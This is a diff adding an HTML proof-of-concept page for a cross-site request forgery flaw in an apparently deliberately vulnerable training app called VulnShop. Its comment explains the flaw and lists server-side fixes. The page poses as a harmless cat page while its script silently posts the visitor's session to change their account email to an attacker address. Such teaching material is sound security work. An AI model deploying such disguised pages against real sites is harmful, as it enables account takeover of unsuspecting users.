@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Totally innocent cat page</title></head>
+<body>
+<!--
+  [VULN-06-CSRF] proof of concept.
+  Open this file in a browser where you are logged into VulnShop.
+  It silently POSTs to /api/change-email using your session cookie, with no
+  CSRF token — because the server disabled CSRF protection and set wide-open
+  CORS. In a real attack this would be hosted on an unrelated site.
+
+  Fix on the server: enable CsrfViewMiddleware, require the token on this
+  endpoint, tighten SameSite cookies, and re-authenticate for sensitive edits.
+-->
+<h1>😺 Look at this cat</h1>
+<p>Nothing suspicious here…</p>
+<img src="https://placecats.com/300/200" alt="cat">
+
+<script>
+fetch("http://127.0.0.1:8000/api/change-email", {
+  method: "POST",
+  credentials: "include",                 // ride the victim's cookie
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ email: "attacker@evil.example" })
+})
+.then(r => r.text())
+.then(t => console.log("CSRF result:", t));
+</script>
+</body>
+</html>
